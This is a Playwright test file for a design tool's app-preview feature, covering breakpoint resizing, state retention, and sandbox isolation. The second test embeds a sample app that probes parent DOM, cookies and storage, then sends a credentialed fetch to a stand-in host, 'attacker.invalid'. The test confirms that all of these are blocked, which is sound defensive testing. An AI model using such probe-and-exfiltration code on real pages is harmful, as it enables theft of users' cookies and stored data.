import { test, expect, type Page } from '@playwright/test'
import { readFile } from 'node:fs/promises'
import { mockStudioSession } from './studio-session'
import { MAKE_FIXTURES } from '../src/make/workspace-model'
import { createAppProject } from '../src/make/manifest'
import { compileAppProject } from '../src/make/compiler'

const saved = createAppProject({ id: 'responsive-counter', name: 'Responsive Counter', files: {
  ...MAKE_FIXTURES.counter.files,
  'src/styles.css': { path: 'src/styles.css', content: MAKE_FIXTURES.counter.files['src/styles.css'].content + `
    .badge { --size: mobile }
    @media(min-width: 768px) { .badge { --size: tablet } }
    @media(min-width: 1280px) { .badge { --size: desktop } }
  ` },
} })

async function setup(page: Page, project = saved) {
  // Match the deployed app without a dev server or external service.
  await page.route('http://127.0.0.1:4173/**', async route => {
    const path = new URL(route.request().url()).pathname
    if (path.startsWith('/api/')) return route.fallback()
    const file = new URL(`../dist${path === '/' ? '/index.html' : path}`, import.meta.url)
    await route.fulfill({ body: await readFile(file), contentType: path.endsWith('.js') ? 'text/javascript' : path.endsWith('.css') ? 'text/css' : 'text/html' })
  })
  await mockStudioSession(page)
  await page.route('**/api/model/budget', route => route.fulfill({ status: 503, json: { error: 'Offline' } }))
  await page.route('**/api/apps', route => route.fulfill({ json: { apps: [project] } }))
  await page.route(`**/api/apps/${project.id}`, route => route.fulfill({ json: project }))
  const compilations: unknown[] = [], writes: string[] = []
  page.on('request', request => {
    if (request.url().includes('/api/apps') && !['GET', 'HEAD'].includes(request.method()) && !request.url().endsWith('/compile')) writes.push(request.url())
  })
  await page.route('**/api/apps/compile', async route => {
    const input = route.request().postDataJSON().project
    compilations.push(input)
    await route.fulfill({ json: await compileAppProject(input) })
  })
  await page.goto('/')
  await expect(page).toHaveTitle('Paper — Space to think')
  await expect(page.locator('vite-error-overlay')).toHaveCount(0)
  await expect(page.getByTestId('canvas-viewport')).toBeVisible()
  await page.getByTestId('tool-rectangle').click()
  const scene = page.locator('.scene-node.is-selected')
  const sceneId = await scene.getAttribute('data-element-id')
  const sceneStyle = await scene.getAttribute('style')
  const camera = await page.getByTestId('viewport-world').getAttribute('style')
  await page.getByRole('button', { name: 'Make workspace', exact: true }).click()
  await page.getByRole('combobox', { name: 'Make project' }).selectOption(project.id)
  return { compilations, writes, sceneId, sceneStyle, camera }
}

test('breakpoint controls resize the live app, preserve state, and explicitly rerun each size without writes', async ({ page }) => {
  const errors: string[] = []
  page.on('pageerror', error => errors.push(error.message))
  const f = await setup(page)
  const chooser = page.getByRole('combobox', { name: 'Preview size', exact: true })
  await expect(chooser).toHaveValue('responsive')
  const rerun = page.getByRole('button', { name: 'Rerun interactions', exact: true })
  await expect(rerun).toBeDisabled()
  await page.getByRole('button', { name: 'Run preview', exact: true }).click()
  await expect(page.getByTestId('make-preview-status')).toHaveText('Running')
  await expect(rerun).toHaveAttribute('title', /Resets.*preview.*state/i)
  const preview = page.frameLocator('iframe').frameLocator('iframe')
  const value = preview.locator('.value')
  const note = preview.getByRole('textbox', { name: 'Note' })
  await preview.getByRole('button', { name: 'Increment', exact: true }).click()
  await note.fill('Keep this across sizes')
  // A marker distinguishes resizing from silently recreating the browsing context.
  await preview.locator('body').evaluate(body => { body.dataset.session = 'original' })
  for (const [size, width, height] of [['mobile', 390, 844], ['tablet', 768, 1024], ['desktop', 1280, 800]] as const) {
    await chooser.selectOption(size)
    await expect(page.getByTestId('make-viewport-dimensions')).toHaveText(`${width} × ${height} px`)
    await expect.poll(() => preview.locator('body').evaluate(() => [innerWidth, innerHeight])).toEqual([width, height])
    expect(await preview.locator('.badge').evaluate(el => getComputedStyle(el).getPropertyValue('--size').trim())).toBe(size)
    await expect(value).toHaveText('1')
    await expect(note).toHaveValue('Keep this across sizes')
    await expect(preview.locator('body')).toHaveAttribute('data-session', 'original')
  }
  for (const size of ['mobile', 'tablet', 'desktop']) {
    await chooser.selectOption(size)
    await rerun.click()
    await expect(page.getByTestId('make-preview-status')).toHaveText('Running')
    await expect(value).toHaveText('0')
    await expect(note).toHaveValue('Interactive preview ready')
    await expect(preview.locator('body')).not.toHaveAttribute('data-session')
    await expect(chooser).toHaveValue(size)
    await preview.getByRole('button', { name: 'Increment', exact: true }).click()
    await expect(value).toHaveText('1')
    await note.fill('Keep this across sizes')
  }
  await chooser.selectOption('responsive')
  await expect(page.getByTestId('make-viewport-dimensions')).toHaveText('Fluid')
  await expect(value).toHaveText('1')
  for (const width of [320, 390, 768, 1440, 1920]) {
    await page.setViewportSize({ width, height: 1000 })
    await expect(chooser).toBeInViewport()
    await expect(rerun).toBeInViewport()
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
    await expect(value).toHaveText('1')
    await expect(note).toHaveValue('Keep this across sizes')
    await chooser.selectOption('desktop')
    await expect.poll(() => preview.locator('body').evaluate(() => innerWidth)).toBe(1280)
    const scroll = page.getByRole('region', { name: 'Preview viewport', exact: true })
    const overflow = await scroll.evaluate(el => ({
      contained: el.scrollWidth > el.clientWidth,
      expected: 1280 > el.clientWidth - 32,
      overflow: getComputedStyle(el).overflowX,
    }))
    expect(overflow.contained).toBe(overflow.expected)
    expect(overflow.overflow).toBe('auto')
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true)
    await page.screenshot({ path: `/tmp/paper-responsive-${width}.png` })
    await chooser.selectOption('responsive')
    await expect.poll(() => preview.locator('body').evaluate(() => innerWidth)).toBeLessThan(width)
  }
  await page.setViewportSize({ width: 1440, height: 900 })
  await page.getByRole('button', { name: 'Stop preview', exact: true }).click()
  await expect(rerun).toBeDisabled()
  expect(f.compilations).toEqual([saved])
  expect(f.writes).toEqual([])
  await page.getByRole('button', { name: 'Design workspace', exact: true }).click()
  await expect(page.locator(`.scene-node[data-element-id="${f.sceneId}"]`)).toHaveAttribute('style', f.sceneStyle!)
  await expect(page.getByTestId('viewport-world')).toHaveAttribute('style', f.camera!)
  await page.getByTestId('history-undo').click()
  await expect(page.locator(`.scene-node[data-element-id="${f.sceneId}"]`)).toHaveCount(0)
  expect(errors).toEqual([])
})

test('resizing and rerunning retain opaque origins, credential isolation, and blocked outbound requests', async ({ page }) => {
  const project = createAppProject({ id: 'responsive-security', name: 'Isolated preview', files: {
    'src/App.tsx': `import { useEffect, useState } from 'react'
      export default function App() {
        const [report, setReport] = useState({})
        useEffect(() => {
          const results = {}
          const probes = {
            parentDOM: () => parent.document, topDOM: () => top.document,
            cookie: () => document.cookie, parentCookie: () => parent.document.cookie,
            local: () => localStorage, session: () => sessionStorage,
            topStorage: () => top.localStorage,
          }
          for (const [name, probe] of Object.entries(probes)) {
            try { probe(); results[name] = 'LEAKED' } catch (error) { results[name] = error.name }
          }
          fetch('https://attacker.invalid/responsive-leak', { credentials: 'include' }).catch(() => {})
          setReport(results)
        }, [])
        return <pre>{JSON.stringify(report)}</pre>
      }`,
  } })
  const f = await setup(page, project)
  await page.evaluate(() => {
    document.cookie = 'paper_private=test-secret; SameSite=Strict; path=/'
    localStorage.setItem('paper-private', 'test-secret')
  })
  let outbound = 0
  await page.route('https://attacker.invalid/**', route => { outbound++; return route.abort() })
  await page.getByRole('button', { name: 'Run preview', exact: true }).click()
  const preview = page.frameLocator('iframe').frameLocator('iframe')
  for (const size of ['mobile', 'tablet', 'desktop', 'responsive']) {
    await page.getByRole('combobox', { name: 'Preview size', exact: true }).selectOption(size)
    await expect(page.getByTestId('make-preview-status')).toHaveText('Running')
    await page.getByRole('button', { name: 'Rerun interactions', exact: true }).click()
    await expect(page.getByTestId('make-preview-status')).toHaveText('Running')
    await expect(preview.locator('pre')).toContainText('SecurityError')
    expect(Object.values(JSON.parse(await preview.locator('pre').innerText()))).toEqual(Array(7).fill('SecurityError'))
    await expect(page.locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts')
    await expect(page.frameLocator('iframe').locator('iframe')).toHaveAttribute('sandbox', 'allow-scripts')
  }
  expect(outbound).toBe(0)
  expect(await page.evaluate(() => localStorage.getItem('paper-private'))).toBe('test-secret')
  expect(f.compilations).toEqual([project])
  expect(f.writes).toEqual([])
})
